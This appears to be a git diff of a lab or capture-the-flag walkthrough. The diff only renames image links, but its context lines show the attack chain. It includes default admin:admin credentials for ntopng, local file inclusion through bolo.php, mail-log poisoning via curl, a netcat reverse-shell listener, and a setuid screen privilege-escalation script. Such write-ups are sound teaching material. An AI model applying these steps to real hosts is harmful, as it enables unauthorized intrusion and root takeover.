@@ -49,7 +49,7 @@ Nmap done: 1 IP address (1 host up) scanned in 20.14 seconds
 
 ### Apache httpd 2.4.25
 
-![1](img/1.png)
+![](images/1.png)
 
 [+] www.html
 
@@ -109,19 +109,19 @@ curl -k http://192.168.56.102:80 -s -L | grep "title\|href" | sed -e 's/^[[:spac
 
 ### Apache Hadoop ntopng
 
-![2](img/2.png)
+![](images/2.png)
 
 At [ntopng Web GUI](https://www.ntop.org/guides/ntopng/web_gui/index.html), I know that the default login is `admin:admin`. Try it and get admin page.
 
-![3](img/3.png)
+![](images/3.png)
 
 Go to `http://192.168.56.102:3000/lua/flows_stats.lua`, there is a url `/turing-bolo/`.
 
-![4](img/4.png)
+![](images/4.png)
 
 There are content at file case.log via url `http://192.168.56.102/turing-bolo/bolo.php?bolo=case`
 
-![5](img/5.png)
+![](images/5.png)
 
 ### Local File Inclusion
 
@@ -141,7 +141,7 @@ Web application auto add `.log` after the provided value. I find some log in the
 
 Tried `bolo=../../../../../../var/log/apt/history`
 
-![6](img/6.png)
+![](images/6.png)
 
 ### Postfix smtpd
 
@@ -206,7 +206,7 @@ quit
 221 2.0.0 Bye
 ```
 
-![7](img/7.png)
+![](images/7.png)
 
 Go to Postfix mail log file `/var/log/mail`
 
@@ -233,7 +233,7 @@ curl -v --silent "http://192.168.56.102/turing-bolo/bolo.php?bolo=/var/log/mail&
 sudo nc -nvlp 4444
 ```
 
-![8](img/8.png)
+![](images/8.png)
 
 ## Privilege escalation
 
@@ -344,7 +344,7 @@ screen -ls # screen itself is setuid, so...
 bash 41154.sh 2> /dev/null
 ```
 
-![9](img/9.png)
+![](images/9.png)
 
 ## Post Exploitation
 
